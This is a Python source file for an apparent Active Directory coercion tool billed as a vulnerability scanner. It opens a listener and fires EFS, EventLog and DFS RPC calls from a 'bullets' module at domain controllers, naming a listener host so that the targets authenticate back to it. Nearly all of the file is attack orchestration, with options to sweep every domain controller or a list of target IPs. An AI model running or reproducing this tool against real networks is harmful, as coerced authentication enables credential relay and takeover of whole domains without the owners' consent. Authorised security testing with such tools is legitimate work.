import argparse
import logging
import socketserver
import sys
import threading
import time

from certipy.lib.target import Target
from concurrent.futures import ThreadPoolExecutor, wait
from copy import deepcopy

from bullets import Cannon, efs2, efs1, even1, dfs1
from utils import get_all_dcs
from impacket.examples import logger
from certipy.commands.parsers import target

available_rpcs = {
    'efs1': efs1,
    'efs2': efs2,
    'even': even1,
    'dfs': dfs1
}


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        data = self.request.recv(1024)
        logging.warning(f'[--->] connection from\x1b[32;1m {self.client_address[0]}:{self.client_address[1]}\x1b[0m', )
        # print(data)
        cur_thread = threading.current_thread()
        # response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
        # self.request.sendall(response)
        self.request.close()


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        add_help=False,
        description="Active Directory Vulnerability Scanner",
    )

    parser.add_argument("-h", "--help", action="help", default=argparse.SUPPRESS,
                        help="Show this help message and exit")
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-all-dc', action='store_true', help='Scan all dcs')
    parser.add_argument('-tf', type=argparse.FileType('r'))
    # 异步运行的话结果展示可能很乱，如果你只关心能不能打成功，不关心是哪个rpc打的，可以选这个
    parser.add_argument('-thread', action='store_true', help='run async scan')
    target.add_argument_group(parser)

    parser.add_argument('-rpcs', nargs='+', choices=available_rpcs.keys(), default=('efs2',), help='rpcs to use')
    parser.add_argument('-auth-proto', nargs='+', choices=('smb', 'http'), default=('smb',), help='回连方式')
    parser.add_argument('-listener', action='store', help='listener')
    parser.add_argument('-server-port', action='store', help='smb server port', default=445, type=int)

    options = parser.parse_args()
    logger.init(options.ts)

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    target = Target()
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
    options.no_pass = True
    targets = []
    t = Target.from_options(options)
    targets = [t]
    if options.all_dc:
        dc_targets = []
        dcs = get_all_dcs(t)
        for dc in dcs:
            tmp_target = deepcopy(t)
            tmp_target.target_ip = dc
            dc_targets.append(tmp_target)
        targets = dc_targets
    if options.tf:
        file_targets = []
        for file_target in options.tf:
            tmp_target = deepcopy(t)
            tmp_target.target_ip = file_target.strip()
            file_targets.append(tmp_target)
        targets = file_targets
    time_start = time.time()
    with ThreadedTCPServer(("0.0.0.0", options.server_port), ThreadedTCPRequestHandler) as server:
        ip, port = server.server_address

        # Start a thread with the server -- that thread will then start one
        # more thread for each request
        server_thread = threading.Thread(target=server.serve_forever)
        # Exit the server thread when the main thread terminates
        server_thread.daemon = True
        server_thread.start()
        logging.info("Server loop running in thread: {server_thread.name}")
        logging.info(f"listening at: {options.server_port}")
        cannons = []

        logging.info(f'{len(options.rpcs)} cannons loaded. fire!')
        for rpc in options.rpcs:
            for my_target in targets:
                cannon = Cannon(**(available_rpcs.get(rpc))._asdict(), shooter=options.listener,
                                target=my_target, delay=0.5, timeout=target.timeout, auth_proto=options.auth_proto)
                cannons.append(cannon)

        if options.thread:
            with ThreadPoolExecutor(max_workers=10) as pool:
                fs = [pool.submit(cannon.shoot) for cannon in cannons]
                wait(fs)
        else:
            for c in cannons:
                c.shoot()
        time_end = time.time()
        print('-' * 50)
        logging.info(f' all jobs done,costs {int(time_end - time_start)}s exit after 5 seconds..')
        time.sleep(5)
        server.shutdown()
